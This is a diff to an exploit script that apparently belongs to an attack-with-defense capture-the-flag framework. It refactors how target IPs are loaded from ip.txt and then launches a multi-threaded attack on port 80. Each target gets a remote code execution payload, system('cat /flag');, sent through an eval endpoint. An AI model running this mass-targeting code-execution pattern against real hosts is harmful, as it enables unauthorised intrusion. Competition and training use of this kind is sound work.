@@ -1,4 +1,4 @@
-from awdframework.awd import Attack,AwdTask
+from awdframework.awd import AwdAttack,AwdTask
 from ..models import Example
 from os.path import dirname
 class Exp(AwdTask):
@@ -12,5 +12,8 @@ class Exp(AwdTask):
         resp = Example.test_available_and_eval(ip,"system('cat /flag');")
         print(resp.text)
 
-attacker = Attack(f"{dirname(__file__)}/../../ip.txt",Exp,port=80,thread_num=5)
+ips = []
+with open(f"{dirname(__file__)}/../../ip.txt") as f:
+    ips = f.read().split("\n")
+attacker = AwdAttack(ips=ips,task_class=Exp,port=80,thread_num=5)
 attacker.attack()
